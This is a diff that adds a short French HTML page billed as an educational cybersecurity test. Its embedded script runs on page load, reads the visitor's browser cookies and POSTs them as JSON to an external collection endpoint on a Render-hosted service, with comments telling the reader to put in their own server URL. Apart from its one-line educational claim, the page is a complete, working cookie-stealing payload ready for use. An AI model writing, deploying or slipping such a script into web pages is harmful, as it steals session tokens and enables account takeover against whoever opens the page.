@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Éducatif Cybersécurité</title>
+</head>
+<body>
+    <h1>Document de Test</h1>
+    <p>Ceci est un fichier pour apprendre la cybersécurité dans un environnement contrôlé.</p>
+
+    <script>
+        // Récupère les cookies du navigateur (simule un token)
+        var cookies = document.cookie || "testToken=exemple123"; // Valeur par défaut pour test
+
+        // Envoie les cookies à ton serveur Render
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://ton-service.onrender.com/collect", true); // Remplace par l'URL de ton service Render
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(JSON.stringify({ token: cookies }));
+
+        // Affiche les données envoyées dans la console pour ton apprentissage
+        console.log("Données envoyées : ", cookies);
+    </script>
+</body>
+</html>
